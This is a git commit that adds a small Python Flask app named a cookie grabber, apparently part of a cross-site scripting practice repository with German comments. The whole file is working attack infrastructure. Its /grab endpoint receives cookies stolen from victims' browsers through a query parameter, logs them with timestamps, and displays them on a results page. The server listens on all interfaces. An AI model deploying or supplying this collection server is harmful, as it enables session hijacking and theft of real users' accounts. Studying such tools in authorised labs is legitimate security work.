8931c5a2335e42333d61a514824599a538e29239
lieutenant-kernel <nikola-mantschev@gmx.at>
2026-03-19 21:01:56 +0100

    Add files via upload

---
+++ Cross-Site Scritping/flask_cookie_grabber.py
@@ -0,0 +1,40 @@
+from flask import Flask, request, render_template_string
+from datetime import datetime
+
+
+app = Flask(__name__)
+# Speicher für die Cookies
+captured_data = []
+
+# HTML Template für die Ansicht
+HTML_PAGE = """
+<html><body>
+    <h1>Abgefangene Cookies</h1>
+    <table border="1">
+        <tr><th>Zeitstempel</th><th>Cookies</th></tr>
+        {% for entry in data %}
+        <tr><td>{{ entry.time }}</td><td>{{ entry.cookies }}</td></tr>
+        {% endfor %}
+    </table>
+</body></html>
+"""
+
+# Dieser Endpoint empfängt die Daten
+@app.route('/grab')
+def grab():
+    cookies = request.args.get('c')
+    print(f"DEBUG: Empfangene Daten: {cookies}")
+    if cookies:
+        captured_data.append({
+            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'cookies': cookies
+        })
+    return "OK", 200
+
+# Hier siehst du die Ergebnisse
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE, data=captured_data)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
